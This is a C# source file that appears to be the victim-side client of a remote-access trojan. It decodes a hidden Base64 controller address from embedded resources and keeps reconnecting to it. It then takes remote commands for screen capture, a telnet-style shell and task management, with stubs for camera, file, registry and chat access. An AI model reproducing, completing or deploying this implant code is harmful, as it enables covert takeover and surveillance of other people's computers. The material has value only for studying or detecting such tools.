using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;

namespace Echo.Net.Server
{
    using System.Net;
    using System.Net.Sockets;
    using System.IO;
    using System.Threading;

    class Server
    {
        static string host;
        static int port;
        static int reconnectSeconds;

        public static TcpClient tcpClient;
        public static PacketStream packetStream;

        [STAThread]
        static void Main(string[] args)
        {
            Trace.Listeners.Add(new ConsoleTraceListener());
            getConfig();

            while (true)
            {
                try
                {
                    if (tcpClient == null || tcpClient.Client.Connected == false)
                    {
                        Connect();
                    }
                    else
                    {
                        Trace.WriteLine("发送登录信息...");
                        ServerPacket loginPacket = new ServerPacket(PacketType.Login);
                        loginPacket.login = new ServerPacket.Login();
                        packetStream.Send(loginPacket);

                        while (tcpClient != null && tcpClient.Client.Connected)
                        {
                            ClientPacket clientPacket = packetStream.Recv<ClientPacket>();
                            switch ((PacketType)clientPacket.type)
                            {
                                //TODO:
                                case PacketType.Ping:
                                    ServerPacket pingPacket = new ServerPacket(PacketType.Ping);
                                    packetStream.Send(pingPacket);
                                    break;
                                case PacketType.MoreInfo:
                                    break;
                                case PacketType.Screen:
                                    Screen.Process(clientPacket.screen);
                                    break;
                                case PacketType.Camera:
                                    break;
                                case PacketType.FileInfo:
                                    break;
                                case PacketType.RegInfo:
                                    break;
                                case PacketType.Telnet:
                                    Telnet.Process(clientPacket.telnet);
                                    break;
                                case PacketType.Chat:
                                    break;
                                case PacketType.TaskMgr:
                                    TaskMgr.Process(clientPacket.taskMgr);
                                    break;
                            }
                        }
                    }
                }
                catch (Exception)
                {
                    Trace.WriteLine("连接失败," + reconnectSeconds + "秒后重试");
                    tcpClient.Close();
                    tcpClient = null;
                    Thread.Sleep(reconnectSeconds * 1000);
                }
            }
        }

        public static void getConfig()
        {
            //Base64("127.0.0.1|60000|10")
            //string cfg = "MTI3LjAuMC4xfDYwMDAwfDEw";
            string base64cfg = Properties.Resources.cfg.Trim();
            byte[] cfg = Convert.FromBase64String(base64cfg);
            string strcfg = Encoding.UTF8.GetString(cfg);
            string[] strs = strcfg.Split('|');
            host = strs[0];
            port = Convert.ToInt32(strs[1]);
            reconnectSeconds = Convert.ToInt32(strs[2]);

            Trace.WriteLine(strcfg);
        }

        public static void Connect()
        {
            Trace.WriteLine("连接中...");
            tcpClient = new TcpClient();
            tcpClient.Connect(host, port);
            packetStream = new PacketStream(tcpClient, true);
        }
    }
}
